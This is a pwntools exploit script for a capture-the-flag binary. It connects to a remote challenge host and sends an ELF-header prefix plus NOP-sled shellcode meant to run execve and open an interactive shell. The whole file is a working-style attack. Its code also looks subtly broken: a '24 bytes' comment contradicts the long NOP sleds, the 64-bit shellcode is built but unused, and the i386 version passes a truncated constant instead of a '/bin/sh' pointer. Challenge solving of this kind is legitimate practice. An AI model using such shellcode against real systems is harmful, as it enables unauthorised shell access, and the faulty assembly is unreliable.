#!/usr/bin/python3
import subprocess
from pwn import *

elf = context.binary = ELF('./chal')

# you can compile your raw binary with the command given below. Also use "wc -c solve" to get the size
gs = '''
b *0x555555555580
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("0.cloud.chals.io", 16612)
    else:
        return process(elf.path)

# Shellcode is 24 bytes
shellcode_64 = asm('\n'.join([
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'movabs rdi, 0x68732f6e69622f',
    'push rdi',
    'mov rdi, rsp',
    'and rsi, rdx',
    'xor rax, rax',
    'mov al, 59',
    'syscall',
]), arch='x86_64')

context.clear(arch='i386')
shellcode = asm('\n'.join([
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'nop',
    'mov eax, 0x0b',
    'mov ebx, 0x68732',
    'xor ecx, ecx',
    'xor edx, edx',
    'int 0x80',
]))


io = start()

payload = b"\x7f"
payload += b"\x45"
payload += b"\x4c"
payload += b"\x46"
payload += shellcode

print(payload)

io.send(payload)

io.interactive()
